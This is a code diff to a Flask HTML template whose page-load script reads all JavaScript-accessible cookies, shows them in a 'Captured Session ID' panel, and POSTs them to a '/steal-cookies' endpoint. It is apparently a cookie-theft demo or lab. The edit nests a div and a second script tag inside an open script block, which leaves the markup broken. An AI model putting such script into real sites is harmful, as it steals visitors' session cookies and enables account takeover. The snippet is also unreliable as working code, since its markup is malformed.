@@ -125,30 +125,35 @@
 
 <script src="{{ url_for('static', filename='script.js') }}"></script>
     <script>
+    <!-- Add a container to display the session ID on the page -->
+<div id="session-display" style="display:none; padding:10px; background:#f0f0f0; border:1px solid #ccc; margin-top:10px;">
+    <strong>Captured Session ID:</strong><br>
+    <span id="session-id-text"></span>
+</div>
+
+<script>
     document.addEventListener("DOMContentLoaded", function() {
-        // Get all cookies accessible via JS
         const cookies = document.cookie;
         
         if (cookies) {
+            // Show the result on the page
+            document.getElementById('session-display').style.display = 'block';
+            document.getElementById('session-id-text').innerText = cookies;
+
+            // Also send it to backend
             fetch('/steal-cookies', {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    cookies: cookies,
-                    timestamp: new Date().toISOString()
-                })
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ cookies: cookies })
             })
             .then(response => response.json())
             .then(data => {
-                console.log("Cookies sent successfully");
+                console.log("Cookies sent and displayed!");
             })
-            .catch(error => {
-                console.error("Error:", error);
-            });
+            .catch(error => console.error('Error:', error));
         }
     });
+</script>
 </script>
 </body>
 </html>
